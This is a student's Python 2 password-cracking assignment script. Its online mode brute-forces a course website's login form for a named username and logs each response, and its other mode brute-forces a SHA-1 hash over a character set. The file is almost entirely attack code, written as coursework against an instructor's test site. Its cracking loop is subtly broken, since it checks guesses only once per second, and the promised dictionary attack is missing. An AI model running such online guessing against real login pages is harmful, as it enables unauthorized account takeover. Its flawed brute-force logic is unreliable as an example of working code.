#!/usr/bin/python
'''
Michael Manzanares
Assigment 1:  This assigment is tasking us to crack three passwords through three different methods.
One method is the random password, with a brute force technique.  Second method is using the dictionary attack
and the other method is an online attack.  Each attack is to be tested on a site made by Dr. Longpre.  All sources used
can be found in the reference section of the report.  There weren't any sources left out.
Prof: Dr. Longpre
02/18/2018
'''

import mechanize
import itertools
import time
import hashlib

print 'which type of search'
typeOFsearch = raw_input()
bank = '1234567890abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ'



pws = 0
counter = 0

currGuess = ''

error = False
iterations = 0

banklen = len(bank)



solved = False

i, i2, i3, i4, i5, i6, i7, i8, i9, i10 = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0

c, c2, c3, c4, c5, c6, c7, c8, c9, c10 = '', '', '', '', '', '', '', '', '', ''
prevTime = time.time()
initTime = time.time()
currTime = time.time()




if typeOFsearch == 'online':
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    combinationsGuesses = itertools.permutations(bank, 2)#enters various method ways
    file = open('loginAttempts.txt', 'w')
    br.open("http://cs5339.cs.utep.edu/longpre/loginScreen.php")#opens the URL
    initTime = time.time()
    for x in combinationsGuesses:
        currTime = time.time()
        br.select_form(nr=0)
        br.form['un'] = 'jonathan61_-bGD'#username given but easily made into reading a text file file.read()
        br.form['pw'] = ''.join(x)#functions of mechanize
        passwordtoString = str(br['pw'])#retrieve the current guess from mechanize to string.  Has to be done before it is submitted
        prevTime = time.time()
        response = br.submit()
        htmlLog = str(response.read())
        file.write(htmlLog)

        file.write(passwordtoString)
        recordTime = round(currTime - initTime, 2)
        recordTimeMin = recordTime/60
        recordTimestr = ' is current guess '+str(recordTimeMin)+ ' minutes & ' + str(recordTime) + ' secs'
        file.write(recordTimestr)
        time.sleep(1)

        print 'next'
elif typeOFsearch == 'random':
    print "what is the hash to be cracked?"
    hashpassword = raw_input()
    initTime = time.time()
    while solved == False:
        while i <= banklen - 1:
            while i2 <= banklen - 1:
                while i3 <= banklen - 1:
                    while i4 <= banklen - 1:
                        while i5 <= banklen - 1:
                            while i6 <= banklen - 1:
                                while i7 <= banklen - 1:
                                    while i8 <= banklen - 1:
                                        while i9 <= banklen - 1:
                                            while i10 <= banklen - 1:
                                                currTime = time.time()  # area of main cracking calculations
                                                if currTime - prevTime >= 1:
                                                    pws = counter
                                                    counter = 0
                                                    prevTime = time.time()
                                                    c10 = bank[i10]
                                                    currGuess = c
                                                    currGuess += c2
                                                    currGuess += c3
                                                    currGuess += c4
                                                    currGuess += c5
                                                    currGuess += c6
                                                    currGuess += c7
                                                    currGuess += c8
                                                    currGuess += c9
                                                    currGuess += c10
                                                    iterations += 1
                                                    print currGuess
                                                    hashed = hashlib.sha1(currGuess).hexdigest()
                                                    if hashed == hashpassword:
                                                        solved = True
                                                        break
                                                    if iterations >= banklen ** 10:
                                                        solved = True
                                                        error = True
                                                        break
                                                    counter += 1
                                                    i10 += 1
                                            c9 = bank[i9]
                                            i9 += 1
                                            i10 = 0
                                            print currGuess
                                            if solved == True:
                                                break#here
                                        c8 = bank[i8]
                                        i8 += 1
                                        i9 = 0
                                        if solved == True:
                                            break
                                    c7 = bank[i7]
                                    i7 += 1
                                    i8 = 0
                                    if solved == True:
                                        break
                                c6 = bank[i6]
                                i6 += 1
                                i7 = 0
                                if solved == True:
                                    break
                            c5 = bank[i5]
                            i5 += 1
                            i6 = 0
                            if solved == True:
                                break
                        c4 = bank[i4]
                        i4 += 1
                        i5 = 0
                        if solved == True:
                            break
                    c3 = bank[i3]
                    i3 += 1
                    i4 = 0
                    print currGuess
                    if solved == True:
                        break
                c2 = bank[i2]
                i2 += 1
                i3 = 0
                if solved == True:
                    break
            c = bank[i]
            i += 1
            i2 = 0
            if solved == True:
                break

                # return the result

    if error == False:
        print 'Solution:', currGuess
        print round(currTime-initTime,2)

    else:
        print 'cannot solve this password'

'''
Again all sources have been placed in the report.  As reminded by professors and TAs that code comments are a bad smell.
'''